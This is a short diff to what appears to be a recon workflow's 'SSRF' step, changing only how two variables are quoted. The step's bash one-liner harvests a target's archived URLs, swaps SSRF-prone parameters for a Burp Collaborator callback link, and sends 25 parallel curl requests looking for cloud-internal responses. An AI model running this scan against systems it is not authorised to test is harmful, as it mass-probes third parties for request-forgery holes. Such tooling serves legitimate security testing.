@@ -9,4 +9,4 @@ steps:
   - name: SSRF
     command: bash
     script: |
-      gau ${target//\"} | gf ssrf | sort -u |anew | httpx | qsreplace ${burpcollaborator_link//\"} | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
+      gau ${target} | gf ssrf | sort -u |anew | httpx | qsreplace ${burpcollaborator_link} | xargs -I % -P 25 sh -c 'curl -ks "%" 2>&1 | grep "compute.internal" && echo "SSRF VULN! %" || true'
